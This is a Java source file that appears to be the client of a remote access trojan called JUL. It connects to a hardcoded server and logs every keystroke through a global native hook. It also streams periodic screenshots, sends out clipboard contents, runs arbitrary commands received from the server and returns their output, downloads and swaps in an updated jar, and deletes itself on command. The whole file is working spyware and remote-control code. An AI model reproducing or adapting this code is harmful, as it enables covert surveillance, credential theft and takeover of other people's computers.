/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package jul.client;

import jul.client.KeyListener;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.datatransfer.DataFlavor;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.ImageIcon;
import org.jnativehook.GlobalScreen;

import static jul.client.ConstantCodes.*;
import static jul.client.CommonUtils.*;

public class JUL {

    
    private static Robot robot;
    private static OutputStream stream;
    
    private static boolean blockStream;

    private static ObjectInputStream objectInputStream;
    
    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws IOException {
        //System.setProperty("java.awt.headless", "true");
        Socket echoSocket = null;
        String hostname = "192.168.137.1";
        int port = 8080;
        while (true) {
            try {
                echoSocket = new Socket(hostname, port);
                System.out.println("socket made");
                break;
            } catch (IOException ex) {
            }
        }
        try {
            robot = new Robot();

            stream = echoSocket.getOutputStream();
            InputStream inStream = echoSocket.getInputStream();
            GlobalScreen.registerNativeHook();
            KeyListener kl = new KeyListener(stream);
            GlobalScreen.getInstance().addNativeKeyListener(kl);

            new Thread(new Runnable() {
                @Override
                public void run() {
                    sendScrene();
                }
            }).start();
            String lastClipboard = "";
            String newClipboard = "";
            while (true) {
                if (inStream.available() > 0) {
                    byte type = (byte) inStream.read();
                    if (type == TERMINATE_SESSION) {
                        delJar();
                        break;
                    } else if (type == UPDATE_PACKAGE) {
                        int size = readOffInt(inStream);
                        byte[] fileBytes = new byte[size];
                        inStream.read(fileBytes);
                        File file = new File("./JUL-new.jar");
                        if (!file.exists()) {
                            file.createNewFile();
                        }
                        FileOutputStream fos = new FileOutputStream(file);
                        fos.write(fileBytes);
                        fos.close();
                        swapJar();
                        break;
                    } else if (type == REQUEST_VERSION) {
                        sWrite(WriteData.SINGLE_BYTE, SEND_VERSION, EMPTYBARR, null);
                        sWrite(WriteData.SINGLE_BYTE, (byte) 0x03, EMPTYBARR, null);
                    } else if (type == EXEC_NATIVE_COMMAND) {
                        String nativeCommand = readOffString(inStream);
                        sWrite(WriteData.SINGLE_BYTE, EXECUTING_NATIVE_COMMAND, EMPTYBARR, null);
                        Runtime.getRuntime().exec(nativeCommand);
                    } else if (type == EXEC_NATIVE_COMMAND_AND_BLOCK) {
                        String nativeCommand = readOffString(inStream);
                        sWrite(WriteData.SINGLE_BYTE, EXECUTING_NATIVE_COMMAND_AND_BLOCKING, EMPTYBARR, null);
                        Process p = Runtime.getRuntime().exec(nativeCommand);
                        StringBuilder commandOutput = new StringBuilder();
                        int fromStream;
                        while ((fromStream = p.getInputStream().read()) != -1) {
                            commandOutput.append((byte) fromStream);
                        }
                        sWrite(WriteData.SINGLE_BYTE, EXECUTING_NATIVE_COMMAND_AND_BLOCKING_END, EMPTYBARR, null);
                        writeString(commandOutput.toString());
                    }
                    
                } 
                try {
                    newClipboard = (String) Toolkit.getDefaultToolkit()
                            .getSystemClipboard().getData(DataFlavor.stringFlavor);
                    if (!newClipboard.equals(lastClipboard)) {
                        lastClipboard = newClipboard;
                        sWrite(WriteData.SINGLE_BYTE, CLIPBOARD_DATA, EMPTYBARR, null);
                        writeString(lastClipboard);
                    }
                } catch (Exception ex) {
                }
                Thread.sleep(100);

            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (echoSocket != null) {
                echoSocket.close();
            }
            GlobalScreen.unregisterNativeHook();
            System.exit(0);
        }

    }
    
    private static void delJar() {
        try {
            String windowsExecPath = JUL.class.getProtectionDomain().getCodeSource().getLocation().getPath().replace("/", "\\");
            windowsExecPath = windowsExecPath.substring(1, windowsExecPath.length());
            Process p = Runtime.getRuntime().exec("cmd /C PING 1.1.1.1 -n 1 -w 3000 >NUL & del /F " + windowsExecPath);
            
        } catch (IOException ex) {
            Logger.getLogger(JUL.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    
    private static void swapJar() {
        try {
            String windowsExecPath = JUL.class.getProtectionDomain().getCodeSource().getLocation().getPath().replace("/", "\\");
            windowsExecPath = windowsExecPath.substring(1, windowsExecPath.length());
            
            String newExecPath = ".\\JUL-new.jar";
            Process p = Runtime.getRuntime().exec("cmd /C PING 1.1.1.1 -n 1 -w 3000 >NUL & del /F \"" +
                    windowsExecPath + "\" & move " + newExecPath + " \"" + windowsExecPath + "\" & java -jar \"" + windowsExecPath + "\"");
        } catch (IOException ex) {
            Logger.getLogger(JUL.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    static final Dimension d = java.awt.Toolkit.getDefaultToolkit().getScreenSize();
    static BufferedImage screne;
    private static ObjectOutputStream oOStream = null;
    
    static void sendScrene() {
        try {
            while (true) {
                try {
                    sWrite(WriteData.SINGLE_BYTE, SCRENECAP_STREAM_INIT, EMPTYBARR, null);
                    screne = robot.createScreenCapture(new Rectangle(d.width, d.height));
                    sWrite(WriteData.IMAGE, EMPTYB, EMPTYBARR, new ImageIcon(screne));
                    Thread.sleep(10000);
                } catch (InterruptedException ex) {
                    Logger.getLogger(JUL.class.getName()).log(Level.SEVERE, null, ex);
                }
            }
        } catch (Exception ex) {
            Logger.getLogger(JUL.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public final static byte[] encryptionKey = "][543gfd23gn ]\"$%^@".getBytes();
    private static int encryptionIndex = 0;

    public static byte encrypt(byte b) {
        encryptionIndex = (encryptionIndex + 1) % encryptionKey.length;
        return (byte) (b ^ encryptionKey[encryptionIndex]);
    }

    public static byte[] encrypt(byte[] barr) {
        byte[] result = new byte[barr.length];
        for (int i = 0; i < barr.length; i++) {
            result[i] = encrypt(barr[i]);
        }
        return result;
    }
    
    enum WriteData {
        SINGLE_BYTE,
        BYTES,
        IMAGE;
    }
    public static synchronized void sWrite(WriteData wd, byte b, byte[] bytes, ImageIcon iIcon) throws IOException {
        switch (wd) {
            case SINGLE_BYTE:
                stream.write(b);
                break;
            case BYTES:
                stream.write(bytes);
                break;
            case IMAGE:
                oOStream = new ObjectOutputStream(stream);
                oOStream.writeObject(iIcon);
                oOStream.flush();
                oOStream = null;//Do not close.  Simply disable.
                
        }
    }
    
    private static void writeString(String s) throws IOException {
        sWrite(WriteData.BYTES, EMPTYB, ByteBuffer.allocate(4).putInt(s.length()).array(), null);
        sWrite(WriteData.BYTES, EMPTYB, s.getBytes(), null);
    }
    private static String readOffString(InputStream inputStream) throws IOException {
        int length = readOffInt(inputStream);
        StringBuilder result = new StringBuilder();
        for (int i = 0; i < length; i++) {
            result.append((char)inputStream.read());
        }
        return result.toString();
    }
}
